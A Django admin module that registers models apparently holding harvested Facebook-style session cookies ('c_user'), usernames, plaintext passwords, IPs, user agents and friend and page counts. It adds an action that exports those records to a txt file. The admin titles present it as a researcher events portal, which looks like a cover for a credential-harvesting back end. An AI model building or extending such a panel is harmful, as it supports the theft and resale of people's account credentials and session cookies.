#!/usr/bin/env python
# -*- coding: utf-8 -*-
# __author__ = 'James'
# 添加Cookies_my admin页面为单独页面
# 参考 https://books.agiliq.com/projects/django-admin-cookbook/en/latest/two_admin.html

from .models import Cookies_my
from django.contrib.admin import AdminSite


class CookieMyAdminSite(AdminSite):
    site_header = "UMSRA Events Admin"
    site_title = "UMSRA Events Admin Portal"
    index_title = "Welcome to UMSRA Researcher Events Portal"
    list_display = ('id', 'c_user', 'username', 'pwd', 'json_format', 'ip', 'ua', 'created', 'updated')

cookie_my_admin_site = CookieMyAdminSite(name='cookie_my_admin')



# 增加一个导出 model 为 csv 的 action
import csv
import datetime
from django.http import HttpResponse
def export_to_csv(modeladmin, request, queryset):
    opts = modeladmin.model._meta
    response = HttpResponse(content_type='text/txt')
    response['Content-Disposition'] = 'attachment;' \
                                      'filename={}.txt'.format(opts.verbose_name)
    writer = csv.writer(response)

    fields = [field for field in opts.get_fields() if not field.many_to_many \
              and not field.one_to_many]

    # 删除一些字段
    filter = ['json_format', 'ua', 'getPagesNum', 'created', 'updated', 'country', 'getFriendsNum']
    fields = [x for x in fields if x.name not in filter]

    # Write a first row with header information
    writer.writerow([field.verbose_name for field in fields])
    # Write data rows
    for obj in queryset:
        data_row = []
        for field in fields:
            value = getattr(obj, field.name)
            if isinstance(value, datetime.datetime):
                value = value.strftime('%d/%m/%Y')
            data_row.append(value)
        writer.writerow(data_row)
    return response


export_to_csv.short_description = 'Export to txt'

# 添加要管理的model

from django.contrib import admin

class CookiesMyAdmin(admin.ModelAdmin):
    list_display = ('id', 'c_user', 'username', 'pwd', 'text', 'ip', 'ua', 'created', 'updated')
    search_fields = ('c_user',)
    ordering = ('created',)
    actions = [export_to_csv]

    #  in the forms on the “add” and “change” pages
    fields = ('c_user', 'text')

cookie_my_admin_site.register(Cookies_my, CookiesMyAdmin)


# 增加显示 Cookie model
from .models import Cookies

cookie_my_admin_site.register(Cookies, CookiesMyAdmin)

